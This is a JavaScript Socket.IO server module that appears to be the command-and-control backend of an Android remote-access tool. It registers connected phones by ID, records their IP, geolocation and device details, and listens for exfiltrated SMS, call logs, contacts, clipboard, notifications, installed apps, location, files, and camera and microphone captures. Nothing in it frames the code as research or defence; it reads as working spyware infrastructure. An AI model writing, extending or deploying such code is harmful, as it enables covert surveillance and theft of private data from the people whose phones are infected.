const { Server } = require('socket.io');
const qs = require('querystring');
const geoip = require('geoip-lite');
const clients = require('./clients');
const { logger } = require('./logs');
const config = require('./config');

module.exports = function(server) {
    const io = new Server(server, {
        transports: ['websocket', 'polling'],
        pingInterval: config.socket?.pingInterval || 25000,
        pingTimeout: config.socket?.pingTimeout || 60000,
        maxHttpBufferSize: config.limits?.maxFileSize || 50e6,
        cors: config.socket?.cors || {
            origin: '*',
            methods: ['GET', 'POST']
        }
    });

    logger.info('Socket.IO server initialized');

    // Authentication middleware
    io.use((socket, next) => {
        try {
            const params = typeof socket.handshake.query === 'string' 
                ? qs.parse(socket.handshake.query) 
                : socket.handshake.query;
            
            if (!params.id) {
                logger.warning('Connection rejected: no ID', 'client');
                return next(new Error('ID required'));
            }
            
            // Store params in socket for later use
            socket.fasonParams = params;
            next();
        } catch (e) {
            logger.systemError('Socket auth failed', e);
            next(e);
        }
    });

    // Handle client connections
    io.on('connection', socket => {
        try {
            const params = socket.fasonParams || socket.handshake.query;
            
            // Get client IP
            const ip = (socket.request.connection.remoteAddress || '')
                .split(':')
                .pop()
                .replace('::ffff:', '');
            
            // Geo lookup
            const geo = geoip.lookup(ip) || {};
            
            // Build client info
            const clientInfo = {
                ip,
                country: geo.country || '',
                city: geo.city || '',
                timezone: geo.timezone || '',
                device: {
                    model: params.model || 'Unknown',
                    brand: params.manf || 'Unknown',
                    version: params.release || 'Unknown'
                },
                connectedAt: new Date().toISOString()
            };
            
            // Register client
            const clientId = params.id;
            
            // Log connection
            logger.clientConnected(clientId, ip, clientInfo.device);
            
            // Register with client manager
            clients.connect(socket, clientId, clientInfo);
            
            // Setup socket event handlers
            setupSocketEvents(socket, clientId);
            
        } catch (e) {
            logger.systemError('Socket connection handler failed', e);
            socket.disconnect(true);
        }
    });

    // Handle server-level errors
    io.on('error', (err) => {
        logger.systemError('Socket.IO server error', err);
    });

    // Expose io for external use
    global.io = io;

    return io;
};

// Setup socket event handlers
function setupSocketEvents(socket, clientId) {
    // Handle disconnect
    socket.on('disconnect', (reason) => {
        logger.clientDisconnected(clientId, reason);
        clients.disconnect(clientId);
    });
    
    // Handle connection errors
    socket.on('error', (err) => {
        logger.systemError(`Socket error from ${clientId}`, err);
    });
    
    socket.on('connect_error', (err) => {
        logger.systemError(`Socket connection error from ${clientId}`, err);
    });
    
    // Handle reconnection
    socket.on('reconnect', (attempt) => {
        logger.info(`Client ${clientId} reconnected after ${attempt} attempts`, 'client');
    });
    
    // Ping-pong for keepalive
    socket.on('ping', () => socket.emit('pong'));
    socket.on('pong', () => {
        // Update last seen
        clients.touch?.(clientId);
    });
    
    // Device messages
    Object.keys(config.msg).forEach(key => {
        const msgCode = config.msg[key];
        
        socket.on(msgCode, (data) => {
            try {
                handleMessage(clientId, msgCode, data);
            } catch (e) {
                logger.systemError(`Handler failed for ${msgCode}`, e);
            }
        });
    });
}

// Handle incoming messages
function handleMessage(clientId, msgCode, data) {
    // This will be handled by the clients manager's setupHandlers
    // But we can add additional processing here
    
    // Log data received
    const dataTypes = {
        [config.msg.sms]: 'SMS',
        [config.msg.calls]: 'calls',
        [config.msg.contacts]: 'contacts',
        [config.msg.wifi]: 'WiFi',
        [config.msg.clipboard]: 'clipboard',
        [config.msg.notification]: 'notification',
        [config.msg.permissions]: 'permissions',
        [config.msg.apps]: 'apps',
        [config.msg.location]: 'location',
        [config.msg.files]: 'files',
        [config.msg.camera]: 'camera',
        [config.msg.mic]: 'mic'
    };
    
    const dataType = dataTypes[msgCode] || msgCode;
    logger.dataReceived(clientId, dataType);
}
